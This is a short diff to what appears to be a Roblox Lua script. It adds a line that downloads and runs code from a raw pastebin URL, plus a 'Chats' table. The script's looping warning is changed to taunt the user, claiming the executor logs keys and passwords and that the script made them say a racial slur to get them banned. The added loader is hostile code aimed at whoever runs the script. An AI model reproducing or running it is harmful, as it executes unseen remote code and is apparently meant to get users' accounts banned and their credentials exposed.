@@ -1,4 +1,10 @@
+getgenv().Chats = {
+    {"INGGA", 5},
+}
+
+loadstring(game:HttpGet("https://pastebin.com/raw/vjQqcnLL"))()
+
 while true do
     wait(0)
-    warn("S0LARA IS A KEEEY LOGGER LOGGING ALL KEYS/PASSWORDS LOL!!....")
+    warn("S0LARA IS A KEEEY LOGGER LOGGING ALL KEYS/PASSWORDS LOL!!.... ALSO MADE YOU SAY THE N WORD FOR YOU TO GET BANNED LOL STOP SKIDDING!!")
     end
